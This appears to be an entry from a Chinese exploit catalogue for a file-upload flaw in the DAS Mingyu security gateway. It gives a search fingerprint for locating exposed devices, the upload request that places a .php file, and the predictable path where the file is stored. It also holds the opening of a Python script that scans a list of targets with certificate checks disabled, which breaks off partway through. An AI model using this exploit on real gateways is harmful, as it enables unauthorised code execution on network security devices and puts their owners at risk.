# 安恒安全网关net_dynamic_pop_adv_submit文件上传漏洞

- **系统**：安恒安全网关net_dynamic_pop_adv_submit　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="明御安全网关"`
- **请求**：`POST /webui/?g=net_dynamic_pop_adv_submit HTTP/1.1`

**请求体 / payload**
```
1.上传文件
Host:
Content-Length: 196
Content-Type: multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd
--qqobiandqgawlxodfiisporjwravxtvd
Content-Disposition: form-data; name="filename"; filename="9B9Ccd.php"
Content-Type: text/plain
2ZqGNnsjzzU2GBBPyd8AIA7QlDq
--qqobiandqgawlxodfiisporjwravxtvd--
2.文件会以时间戳md5的方式存储在/adv/image/md5(时间戳).php
python anheng-net_dynamic_pop_adv_submit-fileupload.py -f subs.txt）
import requests
import hashlib
import time
import argparse
from urllib.parse import urljoin
import ssl
# Disable SSL certificate warnings
ssl._create_default_https_context = ssl._create_unverified_context
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
def read_file(file_path):
"""
Reads a file and returns the list of URLs contained within.
"""
with open(file_path, 'r') as file:
urls = file.read().splitlines()
return urls
def check(url):
"""
Checks the given URL for the 'net_dynamic_pop_adv_submit' file upload vulnerability.
"""
url = url.rstrip("/")
target = urljoin(url, "/webui/?g=net_dynamic_pop_adv_submit")
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
"Connection": "close",
"Content-Length": "203",
"Accept-Encoding": "gzip",
"Content-Type": "multipart/form-data; boundary=qqobiandqgawlxodfiisporjwravxtvd"
data = """--qqobiandqgawlxodfiisporjwravxtvd
Content-Disposition: form-data; name="filename"; filename="9B9Ccd.php"
Content…（脚本共 3703 字，完整版见原文）
```
- **预期**：200　|　—